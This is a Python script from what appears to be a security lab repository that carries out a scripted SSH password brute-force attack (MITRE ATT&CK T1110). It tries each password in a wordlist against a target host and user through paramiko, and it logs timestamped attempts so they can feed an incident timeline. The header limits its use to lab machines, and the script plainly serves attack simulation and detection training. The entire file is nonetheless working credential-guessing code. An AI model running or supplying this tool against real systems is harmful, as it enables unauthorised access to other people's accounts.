#!/usr/bin/env python3
# =============================================================================
# 04-attacks / ssh-bruteforce.py
# T1110 - Brute Force
# Scripted SSH brute force against a target, using a small wordlist, with full
# timestamped logging so each attempt maps cleanly into the incident timeline.
#
# Targets only machines you own (lab). Uses paramiko for SSH.
#
# Usage:
#   python3 ssh-bruteforce.py --target 192.168.64.4 --user kali --wordlist wordlist.txt
# =============================================================================
import argparse, datetime, sys, time

LOGFILE = "bruteforce_timeline.log"

def ts():
    return datetime.datetime.now(datetime.timezone.utc).isoformat()

def log(line):
    msg = f"{ts()} | {line}"
    print(msg, flush=True)
    with open(LOGFILE, "a") as f:
        f.write(msg + "\n")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True, help="target IP")
    ap.add_argument("--port", type=int, default=22)
    ap.add_argument("--user", required=True, help="username to brute")
    ap.add_argument("--wordlist", required=True)
    ap.add_argument("--delay", type=float, default=0.2, help="seconds between attempts")
    ap.add_argument("--max", type=int, default=0, help="0 = whole wordlist")
    args = ap.parse_args()

    try:
        import paramiko
        paramiko_logger = paramiko.util.logging.getLogger("paramiko")
        paramiko_logger.setLevel(100)  # silence paramiko's own noise
    except ImportError:
        print("Install paramiko:  pip3 install paramiko", file=sys.stderr)
        sys.exit(1)

    with open(args.wordlist) as f:
        words = [w.strip() for w in f if w.strip() and not w.lstrip().startswith("#")]
    if args.max:
        words = words[:args.max]

    log(f"[T1110] Brute Force START | target={args.target}:{args.port} user={args.user} "
        f"wordlist={args.wordlist} attempts={len(words)}")
    log(f"[T1110] ATT&CK = https://attack.mitre.org/techniques/T1110/")

    hits = 0
    for i, pw in enumerate(words, 1):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            client.connect(
                args.target, port=args.port,
                username=args.user, password=pw,
                timeout=5, allow_agent=False, look_for_keys=False,
                banner_timeout=5, auth_timeout=5,
            )
            log(f"[T1110] SUCCESS attempt={i} user={args.user} credential_valid=true")
            hits += 1
            client.close()
            break  # one valid cred is enough for the demo
        except paramiko.AuthenticationException:
            log(f"[T1110] FAIL attempt={i} user={args.user}")
        except Exception as e:
            log(f"[T1110] ERROR attempt={i} err={type(e).__name__}: {e}")
        finally:
            try: client.close()
            except: pass
        time.sleep(args.delay)

    log(f"[T1110] Brute Force END | target={args.target} attempts={len(words)} valid={hits}")
    print(f"\n[*] Done. Timeline written to {LOGFILE}")

if __name__ == "__main__":
    main()
